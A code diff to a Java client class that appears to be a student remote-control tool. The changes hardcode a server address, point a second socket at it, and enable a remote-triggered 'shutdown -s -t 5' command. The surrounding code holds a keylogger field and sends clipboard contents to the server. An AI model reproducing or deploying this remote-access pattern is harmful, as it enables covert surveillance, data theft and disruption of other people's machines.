@@ -27,6 +27,10 @@ public class Client
     public static String keyLoger;
     public static boolean isSTOP;
     private static Socket sClient;
+    //Thanh: 26.91.242.109
+    //Minh: 26.250.54.191
+    //Tây: 26.84.204.9
+    private static final String Serverip = "26.91.242.109";
     public static void main(String[] args) throws IOException
     {
 
@@ -36,8 +40,7 @@ public class Client
         //Thanh: 26.91.242.109
         //Minh: 26.250.54.191
         //Tây: 26.84.204.9
-        InetAddress ip = InetAddress.getByName("26.84.204.9");
-
+        InetAddress ip = InetAddress.getByName(Serverip);
         // establish the connection
         Socket s = new Socket(ip, ServerPort);
 
@@ -95,7 +98,7 @@ public class Client
                             }
                             case Message.SHUT_DOWN -> {
                                 System.out.println("Shutdown");
-//                                Runtime.getRuntime().exec("shutdown -s -t 5");
+                                Runtime.getRuntime().exec("shutdown -s -t 5");
                             }case Message.GET_CLIPBOARD -> {
                                 object.data = ClipboardData.getInst().getClipboardContents();
                                 dos.writeObject(object);
@@ -153,7 +156,7 @@ public class Client
                             }
                             case Message.OPEN_SOCKET_CPU -> {
                                 int port = Integer.parseInt(msg.data);
-                                InetAddress ip = InetAddress.getByName("localhost");
+                                InetAddress ip = InetAddress.getByName(Serverip);
                                 sClient = new Socket(ip, port);
                                 ObjectOutputStream dos = new ObjectOutputStream(sClient.getOutputStream());
                                 ObjectInputStream dis = new ObjectInputStream(sClient.getInputStream());
